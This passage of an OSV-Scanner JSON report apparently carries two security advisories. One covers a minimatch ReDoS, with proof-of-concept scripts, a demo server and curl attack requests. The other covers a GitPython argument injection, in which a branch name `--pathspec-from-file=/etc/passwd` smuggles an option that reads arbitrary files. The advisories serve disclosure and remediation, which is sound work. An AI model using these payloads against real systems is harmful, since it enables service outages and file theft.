              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-27904](https://osv.dev/CVE-2026-27904)**.\n\n## [GHSA-23c5-xmqv-rm74](https://osv.dev/GHSA-23c5-xmqv-rm74)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\u003e \n\u003e ---\n\u003e \n\u003e ### Details\n\u003e \n\u003e The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\u003e \n\u003e ```typescript\n\u003e : this.type === '*' \u0026\u0026 bodyDotAllowed ? `)?`\n\u003e : `)${this.type}`\n\u003e ```\n\u003e \n\u003e This produces the following regexps:\n\u003e \n\u003e | Pattern              | Generated regex                          |\n\u003e |----------------------|------------------------------------------|\n\u003e | `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n\u003e | `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n\u003e | `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n\u003e | `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\u003e \n\u003e These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\u003e \n\u003e The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\u003e \n\u003e Measured times via `minimatch()`:\n\u003e \n\u003e | Pattern              | Input              | Time       |\n\u003e |----------------------|--------------------|------------|\n\u003e | `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n\u003e | `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n\u003e | `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n\u003e | `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\u003e \n\u003e Depth inflection at fixed input `a` x16 + `z`:\n\u003e \n\u003e | Depth | Pattern              | Time         |\n\u003e |-------|----------------------|--------------|\n\u003e | 1     | `*(a\\|b)`            | 0ms          |\n\u003e | 2     | `*(*(a\\|b))`         | 4ms          |\n\u003e | 3     | `*(*(*(a\\|b)))`      | 270ms        |\n\u003e | 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\u003e \n\u003e Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\u003e \n\u003e ---\n\u003e \n\u003e ### PoC\n\u003e \n\u003e Tested on minimatch@10.2.2, Node.js 20.\n\u003e \n\u003e **Step 1 -- verify the generated regexps and timing (standalone script)**\n\u003e \n\u003e Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\u003e \n\u003e ```javascript\n\u003e import { minimatch, Minimatch } from 'minimatch'\n\u003e \n\u003e function timed(fn) {\n\u003e   const s = process.hrtime.bigint()\n\u003e   let result, error\n\u003e   try { result = fn() } catch(e) { error = e }\n\u003e   const ms = Number(process.hrtime.bigint() - s) / 1e6\n\u003e   return { ms, result, error }\n\u003e }\n\u003e \n\u003e // Verify generated regexps\n\u003e for (let depth = 1; depth \u003c= 4; depth++) {\n\u003e   let pat = 'a|b'\n\u003e   for (let i = 0; i \u003c depth; i++) pat = `*(${pat})`\n\u003e   const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n\u003e   console.log(`depth=${depth} \"${pat}\" -\u003e ${re}`)\n\u003e }\n\u003e // depth=1 \"*(a|b)\"          -\u003e /^(?:a|b)*$/\n\u003e // depth=2 \"*(*(a|b))\"       -\u003e /^(?:(?:a|b)*)*$/\n\u003e // depth=3 \"*(*(*(a|b)))\"    -\u003e /^(?:(?:(?:a|b)*)*)*$/\n\u003e // depth=4 \"*(*(*(*(a|b))))\" -\u003e /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\u003e \n\u003e // Safe-length timing (exponential growth confirmation without multi-minute hang)\n\u003e const cases = [\n\u003e   ['*(*(*(a|b)))', 15],   // ~270ms\n\u003e   ['*(*(*(a|b)))', 17],   // ~800ms\n\u003e   ['*(*(*(a|b)))', 19],   // ~2400ms\n\u003e   ['*(*(a|b))',    23],   // ~260ms\n\u003e   ['*(a|b)',      101],   // \u003c5ms (depth=1 control)\n\u003e ]\n\u003e for (const [pat, n] of cases) {\n\u003e   const t = timed(() =\u003e minimatch('a'.repeat(n) + 'z', pat))\n\u003e   console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n\u003e }\n\u003e \n\u003e // Confirm noext disables the vulnerability\n\u003e const t_noext = timed(() =\u003e minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\n\u003e console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\u003e \n\u003e // +() is equally affected\n\u003e const t_plus = timed(() =\u003e minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\n\u003e console.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n\u003e ```\n\u003e \n\u003e Observed output:\n\u003e ```\n\u003e depth=1 \"*(a|b)\"          -\u003e /^(?:a|b)*$/\n\u003e depth=2 \"*(*(a|b))\"       -\u003e /^(?:(?:a|b)*)*$/\n\u003e depth=3 \"*(*(*(a|b)))\"    -\u003e /^(?:(?:(?:a|b)*)*)*$/\n\u003e depth=4 \"*(*(*(*(a|b))))\" -\u003e /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\u003e \"*(*(*(a|b)))\" n=15: 269ms result=false\n\u003e \"*(*(*(a|b)))\" n=17: 268ms result=false\n\u003e \"*(*(*(a|b)))\" n=19: 2408ms result=false\n\u003e \"*(*(a|b))\"    n=23: 257ms result=false\n\u003e \"*(a|b)\"       n=101: 0ms result=false\n\u003e noext=true: 0ms (should be ~0ms)\n\u003e \"+(+(+(a|b)))\" n=18: 6300ms result=false\n\u003e ```\n\u003e \n\u003e **Step 2 -- HTTP server (event loop starvation proof)**\n\u003e \n\u003e Save as `poc4-server.mjs`:\n\u003e \n\u003e ```javascript\n\u003e import http from 'node:http'\n\u003e import { URL } from 'node:url'\n\u003e import { minimatch } from 'minimatch'\n\u003e \n\u003e const PORT = 3001\n\u003e http.createServer((req, res) =\u003e {\n\u003e   const url     = new URL(req.url, `http://localhost:${PORT}`)\n\u003e   const pattern = url.searchParams.get('pattern') ?? ''\n\u003e   const path    = url.searchParams.get('path') ?? ''\n\u003e \n\u003e   const start  = process.hrtime.bigint()\n\u003e   const result = minimatch(path, pattern)\n\u003e   const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\u003e \n\u003e   console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n\u003e   res.writeHead(200, { 'Content-Type': 'application/json' })\n\u003e   res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n\u003e }).listen(PORT, () =\u003e console.log(`listening on ${PORT}`))\n\u003e ```\n\u003e \n\u003e Terminal 1 -- start the server:\n\u003e ```\n\u003e node poc4-server.mjs\n\u003e ```\n\u003e \n\u003e Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n\u003e ```\n\u003e curl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29\u0026path=aaaaaaaaaaaaaaaaaaaz\" \u0026\n\u003e ```\n\u003e \n\u003e Terminal 3 -- send a benign request while the attack is in-flight:\n\u003e ```\n\u003e curl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29\u0026path=aaaz\"\n\u003e ```\n\u003e \n\u003e **Observed output -- Terminal 2 (attack):**\n\u003e ```\n\u003e {\"result\":false,\"ms\":\"64149\"}\n\u003e ```\n\u003e \n\u003e **Observed output -- Terminal 3 (benign, concurrent):**\n\u003e ```\n\u003e {\"result\":false,\"ms\":\"0\"}\n\u003e \n\u003e time_total: 63.022047s\n\u003e ```\n\u003e \n\u003e **Terminal 1 (server log):**\n\u003e ```\n\u003e [2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n\u003e [2026-02-20T09:42:21.775Z] done in 64149ms result=false\n\u003e [2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n\u003e [2026-02-20T09:42:21.779Z] done in 0ms result=false\n\u003e ```\n\u003e \n\u003e The server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\u003e \n\u003e Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\u003e \n\u003e ---\n\u003e \n\u003e ### Impact\n\u003e \n\u003e Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\u003e \n\u003e Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\n\u003e \n\u003e `+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\u003e \n\u003e **Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/tools/emoji-precache/package-lock.json | minimatch | 3.1.2 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | minimatch | 10.1.1 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-23c5-xmqv-rm74 | minimatch | 10.2.3, 3.1.4, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/tools/emoji-precache/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-27904\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-27904\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-27904](https://osv.dev/CVE-2026-27904)**.\n\n## [GHSA-23c5-xmqv-rm74](https://osv.dev/GHSA-23c5-xmqv-rm74)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\u003e \n\u003e ---\n\u003e \n\u003e ### Details\n\u003e \n\u003e The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\u003e \n\u003e ```typescript\n\u003e : this.type === '*' \u0026\u0026 bodyDotAllowed ? `)?`\n\u003e : `)${this.type}`\n\u003e ```\n\u003e \n\u003e This produces the following regexps:\n\u003e \n\u003e | Pattern              | Generated regex                          |\n\u003e |----------------------|------------------------------------------|\n\u003e | `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n\u003e | `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n\u003e | `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n\u003e | `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\u003e \n\u003e These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\u003e \n\u003e The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\u003e \n\u003e Measured times via `minimatch()`:\n\u003e \n\u003e | Pattern              | Input              | Time       |\n\u003e |----------------------|--------------------|------------|\n\u003e | `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n\u003e | `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n\u003e | `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n\u003e | `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\u003e \n\u003e Depth inflection at fixed input `a` x16 + `z`:\n\u003e \n\u003e | Depth | Pattern              | Time         |\n\u003e |-------|----------------------|--------------|\n\u003e | 1     | `*(a\\|b)`            | 0ms          |\n\u003e | 2     | `*(*(a\\|b))`         | 4ms          |\n\u003e | 3     | `*(*(*(a\\|b)))`      | 270ms        |\n\u003e | 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\u003e \n\u003e Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\u003e \n\u003e ---\n\u003e \n\u003e ### PoC\n\u003e \n\u003e Tested on minimatch@10.2.2, Node.js 20.\n\u003e \n\u003e **Step 1 -- verify the generated regexps and timing (standalone script)**\n\u003e \n\u003e Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\u003e \n\u003e ```javascript\n\u003e import { minimatch, Minimatch } from 'minimatch'\n\u003e \n\u003e function timed(fn) {\n\u003e   const s = process.hrtime.bigint()\n\u003e   let result, error\n\u003e   try { result = fn() } catch(e) { error = e }\n\u003e   const ms = Number(process.hrtime.bigint() - s) / 1e6\n\u003e   return { ms, result, error }\n\u003e }\n\u003e \n\u003e // Verify generated regexps\n\u003e for (let depth = 1; depth \u003c= 4; depth++) {\n\u003e   let pat = 'a|b'\n\u003e   for (let i = 0; i \u003c depth; i++) pat = `*(${pat})`\n\u003e   const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n\u003e   console.log(`depth=${depth} \"${pat}\" -\u003e ${re}`)\n\u003e }\n\u003e // depth=1 \"*(a|b)\"          -\u003e /^(?:a|b)*$/\n\u003e // depth=2 \"*(*(a|b))\"       -\u003e /^(?:(?:a|b)*)*$/\n\u003e // depth=3 \"*(*(*(a|b)))\"    -\u003e /^(?:(?:(?:a|b)*)*)*$/\n\u003e // depth=4 \"*(*(*(*(a|b))))\" -\u003e /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\u003e \n\u003e // Safe-length timing (exponential growth confirmation without multi-minute hang)\n\u003e const cases = [\n\u003e   ['*(*(*(a|b)))', 15],   // ~270ms\n\u003e   ['*(*(*(a|b)))', 17],   // ~800ms\n\u003e   ['*(*(*(a|b)))', 19],   // ~2400ms\n\u003e   ['*(*(a|b))',    23],   // ~260ms\n\u003e   ['*(a|b)',      101],   // \u003c5ms (depth=1 control)\n\u003e ]\n\u003e for (const [pat, n] of cases) {\n\u003e   const t = timed(() =\u003e minimatch('a'.repeat(n) + 'z', pat))\n\u003e   console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n\u003e }\n\u003e \n\u003e // Confirm noext disables the vulnerability\n\u003e const t_noext = timed(() =\u003e minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\n\u003e console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\u003e \n\u003e // +() is equally affected\n\u003e const t_plus = timed(() =\u003e minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\n\u003e console.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n\u003e ```\n\u003e \n\u003e Observed output:\n\u003e ```\n\u003e depth=1 \"*(a|b)\"          -\u003e /^(?:a|b)*$/\n\u003e depth=2 \"*(*(a|b))\"       -\u003e /^(?:(?:a|b)*)*$/\n\u003e depth=3 \"*(*(*(a|b)))\"    -\u003e /^(?:(?:(?:a|b)*)*)*$/\n\u003e depth=4 \"*(*(*(*(a|b))))\" -\u003e /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\u003e \"*(*(*(a|b)))\" n=15: 269ms result=false\n\u003e \"*(*(*(a|b)))\" n=17: 268ms result=false\n\u003e \"*(*(*(a|b)))\" n=19: 2408ms result=false\n\u003e \"*(*(a|b))\"    n=23: 257ms result=false\n\u003e \"*(a|b)\"       n=101: 0ms result=false\n\u003e noext=true: 0ms (should be ~0ms)\n\u003e \"+(+(+(a|b)))\" n=18: 6300ms result=false\n\u003e ```\n\u003e \n\u003e **Step 2 -- HTTP server (event loop starvation proof)**\n\u003e \n\u003e Save as `poc4-server.mjs`:\n\u003e \n\u003e ```javascript\n\u003e import http from 'node:http'\n\u003e import { URL } from 'node:url'\n\u003e import { minimatch } from 'minimatch'\n\u003e \n\u003e const PORT = 3001\n\u003e http.createServer((req, res) =\u003e {\n\u003e   const url     = new URL(req.url, `http://localhost:${PORT}`)\n\u003e   const pattern = url.searchParams.get('pattern') ?? ''\n\u003e   const path    = url.searchParams.get('path') ?? ''\n\u003e \n\u003e   const start  = process.hrtime.bigint()\n\u003e   const result = minimatch(path, pattern)\n\u003e   const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\u003e \n\u003e   console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n\u003e   res.writeHead(200, { 'Content-Type': 'application/json' })\n\u003e   res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n\u003e }).listen(PORT, () =\u003e console.log(`listening on ${PORT}`))\n\u003e ```\n\u003e \n\u003e Terminal 1 -- start the server:\n\u003e ```\n\u003e node poc4-server.mjs\n\u003e ```\n\u003e \n\u003e Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n\u003e ```\n\u003e curl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29\u0026path=aaaaaaaaaaaaaaaaaaaz\" \u0026\n\u003e ```\n\u003e \n\u003e Terminal 3 -- send a benign request while the attack is in-flight:\n\u003e ```\n\u003e curl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29\u0026path=aaaz\"\n\u003e ```\n\u003e \n\u003e **Observed output -- Terminal 2 (attack):**\n\u003e ```\n\u003e {\"result\":false,\"ms\":\"64149\"}\n\u003e ```\n\u003e \n\u003e **Observed output -- Terminal 3 (benign, concurrent):**\n\u003e ```\n\u003e {\"result\":false,\"ms\":\"0\"}\n\u003e \n\u003e time_total: 63.022047s\n\u003e ```\n\u003e \n\u003e **Terminal 1 (server log):**\n\u003e ```\n\u003e [2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n\u003e [2026-02-20T09:42:21.775Z] done in 64149ms result=false\n\u003e [2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n\u003e [2026-02-20T09:42:21.779Z] done in 0ms result=false\n\u003e ```\n\u003e \n\u003e The server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\u003e \n\u003e Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\u003e \n\u003e ---\n\u003e \n\u003e ### Impact\n\u003e \n\u003e Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\u003e \n\u003e Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\n\u003e \n\u003e `+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\u003e \n\u003e **Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/tools/emoji-precache/package-lock.json | minimatch | 3.1.2 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | minimatch | 10.1.1 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-23c5-xmqv-rm74 | minimatch | 10.2.3, 3.1.4, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/tools/emoji-precache/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-27904\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-27904\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-27904",
              "name": "CVE-2026-27904",
              "properties": {
                "security-severity": "7.5"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-27904: minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions",
                "text": "CVE-2026-27904: minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-110859",
                "GHSA-23mf-xhv8-69c2"
              ],
              "fullDescription": {
                "markdown": "\u003e **A note on the referenced files.** This report was submitted through GitHub's private\n\u003e vulnerability reporting API, which carries no attachments. Every transcript this report leans\n\u003e on is reproduced **inline above**, verbatim. The file names it mentions (`poc.sh`, `poc.log`,\n\u003e per-case transcripts, `evidence.md`, `negative-controls.md`, blob-sweep tables) are the local\n\u003e evidence bundle those inline excerpts were extracted from, with a checksum manifest. I am happy\n\u003e to send the bundle by any channel you prefer, or to open a private fork — just say which. The\n\u003e PoC scripts are self-contained and reproduce the result from a clean environment.\n\n---\n\n**Affected:** `\u003c= 3.1.62` — all published releases; also `main` @ `4905b4af`\n**Verified at runtime:** GitPython `3.1.62` with git `2.55.0`\n**Date:** 2026-09-10\n**Reporter:** MAXI8594\n\n---\n\n## Threat model\n\n| | |\n|---|---|\n| **Attacker** | anyone who can get the application to clone a URL they control. No account, no credential, no privilege in the consuming application. |\n| **Pre-need** | a repository they host, with `HEAD` pointing at a branch whose name is the payload. A `git push` to a plain git server is enough — no filesystem access to a server is required (`raw/06`). |\n| **Gets** | the contents of any file the application's process can read, returned in band through the exception. `/etc/passwd` recovered 34 of 34 lines. |\n| **Real-world likelihood** | **High.** The vulnerable consumer is six lines of ordinary code with no unusual configuration: `Repo.clone_from(user_url)` then `repo.active_branch.checkout()`. `allow_unsafe_options=False` is the default. Cloning user-supplied URLs is the library's central use case — CI systems, repository importers, scanners and bots. |\n\n**On severity relative to the sibling advisories.** GitHub, as CNA, scored the three prior\nadvisories in this class at 6.5 / `PR:L` (CVE-2026-76217, CVE-2026-78678, CVE-2026-78679). This\nreport asks for 7.5 / `PR:N`, and the difference is one measured fact: in those three, the\napplication had to pass an attacker-influenced value into the API. Here it passes nothing — the\nclone materialises the hostile branch on its own and `repo.active_branch` returns it\n(`raw/02`). If that reading is not accepted, the `PR:L` path via `Repo.create_head()` is also real\nand lands at 6.5, matching the siblings.\n\n## Summary\n\n`Head.checkout()` guards its `**kwargs` against unsafe Git options but never inspects its own\npositional argument — the branch name — which reaches the `git checkout` argv with no `--`\nseparator. A repository whose default branch is named `--pathspec-from-file=/etc/passwd` makes a\nconsumer that merely clones it and checks out the default branch return the entire contents of that\nfile to the caller.\n\nThis is the exact combination of two advisories the project already fixed:\n\n- **CVE-2026-76217** (`GHSA-hh9p-6wh2-4mfc`) — *\"Arbitrary file read via `--pathspec-from-file` in\n  `IndexFile.remove()` **and `Head.checkout()`**\"*. Fixed in 3.1.58 by commit `f2550b65`, which added\n  the guard to this exact method — but only for `**kwargs`.\n- **CVE-2026-78679** (`GHSA-3wxw-xv34-2frg`) — *\"`TagReference.create` positional reference\n  bypasses kwargs-only `--file` guard, enabling arbitrary file read (incomplete fix of 3af0c251)\"*. Fixed in 3.1.59 by commit `1b0d2d9b`, which applied the\n  positional check to `git/refs/tag.py`, `git/diff.py`, `git/index/base.py` and `git/repo/base.py` —\n  but not to `git/refs/head.py:286`.\n\n`f2550b65` states in its own commit message that the audit found the positional variant and applied\nit to `HEAD.reset` — 185 lines above `Head.checkout`, in the same file, in the same commit:\n\n\u003e \"The audit also found that **reset's positional commit could carry the option before its argument\n\u003e separator**. […] **Check reset's positional commit as well as keyword options**\"\n\n`HEAD.reset` got the fix. `Head.checkout` did not, and `1b0d2d9b` did not come back for it.\n\n## Affected Asset\n\n| | |\n|---|---|\n| Package | `GitPython` (PyPI) |\n| Affected versions | **`\u003c= 3.1.62`** — all published releases |\n| Latest release tested | `3.1.62` |\n| Also present on | `main` @ `4905b4af` |\n| Vulnerable file | `git/refs/head.py` |\n| Guard | line 286 — `Git._option_candidates([], kwargs)` |\n| Sink | line 293 — `self.repo.git.checkout(self, **kwargs)` |\n| CWE | CWE-88 (Argument Injection), CWE-73 (External Control of File Name or Path), CWE-200 (Exposure of Sensitive Information) |\n| CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High** |\n\nThe version range was established by **blob hash against every tag**, not by dates: the sink line\n`self.repo.git.checkout(self, **kwargs)` — with no `--` separator — is present in `git/refs/head.py`\nin every tag from `0.3.1-beta2` through `3.1.62`. The `3.1.62` blob is byte-identical to `main`:\n`7f563374ef9e018b3d5f95054498e8591e112ce2`. Full sweep in `raw/07-blob-version-sweep.txt`.\n\nThe kwargs-only guard first appears in **3.1.58**, so `3.1.58`–`3.1.62` is where \"incomplete fix\"\napplies; earlier releases have the same sink with no guard at all.\n\n## Vulnerability Details\n\n### Root cause\n\n`git/cmd.py:1045` — `_option_candidates()` only inspects the positionals it is handed:\n\n```python\n@classmethod\ndef _option_candidates(cls, args: Sequence[Any] = (), kwargs: Optional[Mapping[str, Any]] = None) -\u003e List[str]:\n    \"\"\"Collect possible option spellings before command-line transformation.\"\"\"\n    options = [\n        option for option in cls._unpack_args([arg for arg in args if arg is not None]) if option.startswith(\"-\")\n    ]\n```\n\nSo `_option_candidates([], kwargs)` means: *check the keyword arguments, never check the positional\narguments this method puts on the command line.* That is fine when the method has no\nattacker-influenced positional, or when it separates them with 